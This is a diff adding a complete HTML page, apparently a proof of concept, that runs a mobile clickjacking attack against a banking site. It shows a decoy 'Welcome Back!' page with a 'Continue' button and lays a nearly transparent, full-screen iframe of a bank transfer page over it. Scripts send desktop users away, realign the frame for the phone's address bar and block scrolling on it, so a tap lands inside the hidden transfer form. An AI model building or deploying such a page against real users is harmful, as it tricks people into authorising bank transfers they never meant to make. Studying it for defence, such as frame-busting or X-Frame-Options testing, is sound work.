@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Mobile Banking</title>
+    <link rel="stylesheet" href="/styles/overlay.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        @media screen and (max-width: 768px) {
+            .mobile-container {
+                position: relative;
+                width: 100%;
+                height: 100vh;
+                padding: 20px;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .app-interface {
+                background: white;
+                border-radius: 15px;
+                padding: 30px 20px;
+                width: 100%;
+                max-width: 400px;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+                text-align: center;
+                position: relative;
+                z-index: 1;
+            }
+
+            .app-header {
+                font-size: 24px;
+                color: #333;
+                margin-bottom: 10px;
+                font-weight: 600;
+            }
+
+            .app-subtitle {
+                color: #666;
+                font-size: 14px;
+                margin-bottom: 30px;
+            }
+
+            .continue-btn {
+                background: #667eea;
+                color: white;
+                border: none;
+                padding: 16px 40px;
+                font-size: 18px;
+                border-radius: 30px;
+                width: 100%;
+                font-weight: 600;
+                cursor: pointer;
+                position: relative;
+                z-index: 2;
+            }
+
+            .malicious-iframe {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                opacity: 0.01;
+                z-index: 999;
+                border: none;
+                pointer-events: auto;
+            }
+        }
+
+        @media screen and (min-width: 769px) {
+            .mobile-container {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <div class="app-interface">
+            <div class="app-header">Welcome Back!</div>
+            <div class="app-subtitle">Tap continue to access your account securely</div>
+            <button class="continue-btn" id="continueBtn">Continue</button>
+        </div>
+        <iframe id="targetFrame" class="malicious-iframe" src="https://secure-banking.example.com/mobile/transfer"></iframe>
+    </div>
+
+    <script src="/js/frame-controller.js"></script>
+    <script>
+        // Mobile browser detection
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
+        }
+
+        // Redirect non-mobile users
+        if (!isMobileDevice()) {
+            window.location.href = '/index.html';
+        }
+
+        // Touch event handlers
+        const continueBtn = document.getElementById('continueBtn');
+        const targetFrame = document.getElementById('targetFrame');
+
+        continueBtn.addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            this.style.transform = 'scale(0.95)';
+        });
+
+        continueBtn.addEventListener('touchend', function(e) {
+            e.preventDefault();
+            this.style.transform = 'scale(1)';
+        });
+
+        // Position adjustment for mobile browser UI
+        function adjustForMobileBrowser() {
+            const vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh}px`);
+            
+            // Adjust iframe positioning to account for address bar
+            const toolbar = window.outerHeight - window.innerHeight;
+            targetFrame.style.top = `-${toolbar}px`;
+        }
+
+        window.addEventListener('resize', adjustForMobileBrowser);
+        window.addEventListener('orientationchange', adjustForMobileBrowser);
+        adjustForMobileBrowser();
+
+        // Prevent default touch behavior
+        document.addEventListener('touchmove', function(e) {
+            if (e.target === targetFrame) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+    </script>
+</body>
+</html>
